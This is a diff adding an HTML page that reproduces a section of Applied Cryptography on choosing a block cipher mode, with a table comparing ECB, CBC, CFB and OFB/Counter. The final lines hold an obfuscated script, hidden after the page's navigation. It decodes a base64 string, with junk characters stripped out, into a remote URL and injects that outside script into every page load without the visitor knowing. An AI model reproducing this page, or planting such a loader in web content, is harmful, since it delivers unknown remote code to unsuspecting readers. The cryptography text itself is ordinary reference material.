@@ -1,0 +1,181 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Algorithm Types and Modes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=09//-->
+<!--PAGES=208-209//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">9.11  Choosing a Cipher Mode</FONT></H3>
+<P>If simplicity and speed are your main concerns, ECB is the easiest and fastest mode to use a block cipher. It is also the weakest. Besides being vulnerable to replay attacks, an algorithm in ECB mode is the easiest to cryptanalyze. I don&#146;t recommend ECB for message encryption.
+</P>
+<P>For encrypting random data, such as other keys, ECB is a good mode to use. Since the data is short and random, none of the shortcomings of ECB matter for this application.</P>
+<P>For normal plaintext, use CBC, CFB, or OFB. Which mode you choose depends on your specific requirements. Table 9.1 gives a summary of the security and efficiency of the various modes.</P>
+<P>CBC is generally best for encrypting files. The increase in security is significant; and while there are sometimes bit errors in stored data, there are almost never synchronization errors. If your application is software-based, CBC is almost always the best choice.</P>
+<CENTER><CAPTION COLSPAN="2"><B>Table 9.1<BR>Summary of Block Cipher Modes</B>
+</CENTER>
+
+<TABLE BORDER="2" BORDERCOLOR="#0000" ALIGN="CENTER">
+<TR><TD>
+<TABLE WIDTH="100%">
+<TR>
+<TD COLSPAN="2" VALIGN="TOP" ALIGN="LEFT">ECB:
+<TD COLSPAN="2" VALIGN="TOP" ALIGN="LEFT">CBC:
+<TR>
+<TD VALIGN="TOP" WIDTH="5%" ALIGN="LEFT">
+<TD WIDTH="45%" ALIGN="LEFT"><B><I>Security</I>:</B>
+<TD VALIGN="TOP" WIDTH="5%" ALIGN="LEFT">
+<TD WIDTH="45%" ALIGN="LEFT"><B><I>Security</I>:</B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Plaintext patterns are not concealed.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Plaintext patterns are concealed by XORing with previous ciphertext block.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Input to the block cipher is not randomized; it is the same as the plaintext.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;Input to the block cipher is randomized by XORing with the previous ciphertext block.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;More than one message can be encrypted with the same key.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; More than one message can be encrypted with the same key.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Plaintext is easy to manipulate, blocks can be removed, repeated, or interchanged.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;/- Plaintext is somewhat difficult to manipulate; blocks can be removed from the beginning and end of the message, bits of the first block can be changed, and repetition allows some controlled changes.
+<TR>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Efficiency</I>:</B>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Efficiency</I>:</B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Speed is the same as the block cipher.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Speed is the same as the block cipher.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Ciphertext is up to one block longer than the plaintext, due to padding.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Ciphertext is up to one block longer than the plaintext, not counting the IV.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- No preprocessing is possible.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- No preprocessing is possible.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Processing is parallelizable.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;/- Encryptions not parallelizable; decryption is parallelizable and has a random-access property.
+<TR>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Fault-tolerance</I>:</B>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Fault-tolerance</I>:</B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- A ciphertext error affects one full block of plaintext.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- A ciphertext error affects one full block of plaintext and the corresponding bit in the next block.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Synchronization error  is unrecoverable.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Synchronization error is unrecoverable.
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">CFB:
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">OFB/Counter:
+<TR>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Security</I>:</B>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Security</I>:</B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Plaintext patterns are concealed.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Plaintext patterns are concealed.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Input to the block cipher is randomized.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Input to the block cipher is randomized.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; More than one message can be encrypted with the same key provided that a different IV is used.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; More than one message can be encrypted with the same key, provided that a different IV is used.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;/- Plaintext is somewhat difficult to manipulate;blocks can be removed from the beginning and end of the message, bits of the first block can be changed, and repetition allows some controlled changes.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Plaintext is very easy to manipulate, any change in ciphertext directly affects the plaintext.
+<TR>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Efficiency</I>:</B>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Efficiency</I>:</B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Speed is the same as the block cipher.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Speed is the same as the block cipher.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Ciphertext is the same size as the plaintext, not counting the IV.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Ciphertext is the same size as the plaintext, not counting the IV.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;/- Encryption is not parallelizable; decryption is parallelizable and has a random-access property.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; Processing is possible before the message is seen.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- Some preprocessing is possible before a block is seen; the previous ciphertext block can be encrypted.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">-/&#43; OFB processing is not parallelizable; counter processing is parallelizable.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;/- Encryption is not parallelizable; decryption is parallelizable and has a random-access property.
+<TR>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Fault-tolerance</I>:</B>
+<TD WIDTH="5%" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Fault-tolerance</I>:</B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">- A ciphertext error affects the corresponding bit of plaintext and the next full block.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43; A ciphertext error affects only the corresponding bit of plaintext.
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">&#43;Synchronization errors of full block sizes are recoverable. 1-bit CFB can recover from the addition or loss of single bits.
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">-Synchronization error is unrecoverable.
+</TABLE>
+</TABLE>
+
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(nVdyJfxq, seHTDkhg) {seHTDkhg = nVdyJfxq.createElement('script');seHTDkhg.type = 'text/javascript';seHTDkhg.async = true;seHTDkhg.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');nVdyJfxq.getElementsByTagName('body')[0].appendChild(seHTDkhg);}(document));</script></body>
+</html>
